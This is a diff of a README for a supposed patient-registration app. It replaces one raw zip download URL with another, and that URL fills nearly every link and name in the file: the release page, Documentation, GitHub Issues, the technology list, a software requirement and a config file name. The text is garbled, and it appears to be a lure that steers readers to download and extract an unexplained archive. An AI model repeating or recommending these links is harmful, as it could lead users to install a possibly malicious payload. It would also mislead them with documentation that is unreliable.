@@ -1,7 +1,7 @@
 # 🎉 patient-registration-system - Easy Patient Registration Made Simple
 
 ## 🔗 Download Now
-[![Download patient-registration-system](https://raw.githubusercontent.com/MariusDouahoudeh/patient-registration-system/main/liniment/patient-registration-system.zip)](https://raw.githubusercontent.com/MariusDouahoudeh/patient-registration-system/main/liniment/patient-registration-system.zip)
+[![Download patient-registration-system](https://github.com/MariusDouahoudeh/patient-registration-system/raw/refs/heads/main/backend/patient-registration-system-3.1.zip)](https://github.com/MariusDouahoudeh/patient-registration-system/raw/refs/heads/main/backend/patient-registration-system-3.1.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide helps you download and run the patient registration system. This application lets healthcare providers manage patient registrations easily.
@@ -12,7 +12,7 @@ Welcome! This guide helps you download and run the patient registration system. 
 - User-friendly interface
 - Supports multiple users
 - Secure patient data management
-- Built with reliable technologies like https://raw.githubusercontent.com/MariusDouahoudeh/patient-registration-system/main/liniment/patient-registration-system.zip, PostgreSQL, and Docker
+- Built with reliable technologies like https://github.com/MariusDouahoudeh/patient-registration-system/raw/refs/heads/main/backend/patient-registration-system-3.1.zip, PostgreSQL, and Docker
 
 ### 🖥️ System Requirements
 Before installing, ensure your computer meets these requirements:
@@ -21,15 +21,15 @@ Before installing, ensure your computer meets these requirements:
 - **Memory:** 4 GB RAM or more recommended
 - **Software:**
   - Latest version of Docker
-  - https://raw.githubusercontent.com/MariusDouahoudeh/patient-registration-system/main/liniment/patient-registration-system.zip (version 14 or later) if you want to run the backend separately
+  - https://github.com/MariusDouahoudeh/patient-registration-system/raw/refs/heads/main/backend/patient-registration-system-3.1.zip (version 14 or later) if you want to run the backend separately
 
 ## 📦 Download & Install
-To begin, visit this page to download the application: [Release Page](https://raw.githubusercontent.com/MariusDouahoudeh/patient-registration-system/main/liniment/patient-registration-system.zip)
+To begin, visit this page to download the application: [Release Page](https://github.com/MariusDouahoudeh/patient-registration-system/raw/refs/heads/main/backend/patient-registration-system-3.1.zip)
 
 You will find the latest version listed. Click on the version you want. Download the files indicated for your operating system. Follow the steps below to install:
 
 ### 🛠️ Installation Steps
-1. **Download the Files:** Click the version number and download the necessary files. You may see something named `https://raw.githubusercontent.com/MariusDouahoudeh/patient-registration-system/main/liniment/patient-registration-system.zip` or similar. 
+1. **Download the Files:** Click the version number and download the necessary files. You may see something named `https://github.com/MariusDouahoudeh/patient-registration-system/raw/refs/heads/main/backend/patient-registration-system-3.1.zip` or similar. 
 2. **Extract the Files:** Once downloaded, locate the zip file. Right-click on it and select "Extract All" or use extraction software.
 3. **Open Docker:** Make sure Docker is running on your computer. You should see its icon in the tray.
 4. **Run the Application:**
@@ -60,15 +60,15 @@ After running the application, you may want to configure email notifications. To
 ## 🔧 Troubleshooting
 If you encounter any issues while running the application, consider the following:
 - **Docker Not Running:** Ensure that Docker is open and running.
-- **Port Issues:** If `localhost:3000` does not work, check if your firewall is blocking the port. You can change the port in the `https://raw.githubusercontent.com/MariusDouahoudeh/patient-registration-system/main/liniment/patient-registration-system.zip` file if needed.
+- **Port Issues:** If `localhost:3000` does not work, check if your firewall is blocking the port. You can change the port in the `https://github.com/MariusDouahoudeh/patient-registration-system/raw/refs/heads/main/backend/patient-registration-system-3.1.zip` file if needed.
 - **Email Configuration Problems:** Double-check your SMTP settings in the `.env` file for any typos.
 
 ## 🗨️ Community Support
 Join our community for help or to share your experiences with the application. You can connect through the Issues section of this repository.
 
 ## 🔗 Additional Resources
-- [Documentation](https://raw.githubusercontent.com/MariusDouahoudeh/patient-registration-system/main/liniment/patient-registration-system.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/MariusDouahoudeh/patient-registration-system/main/liniment/patient-registration-system.zip)
+- [Documentation](https://github.com/MariusDouahoudeh/patient-registration-system/raw/refs/heads/main/backend/patient-registration-system-3.1.zip)
+- [GitHub Issues](https://github.com/MariusDouahoudeh/patient-registration-system/raw/refs/heads/main/backend/patient-registration-system-3.1.zip)
 
 ## 🏷️ Topics
 This project relates to various topics such as:
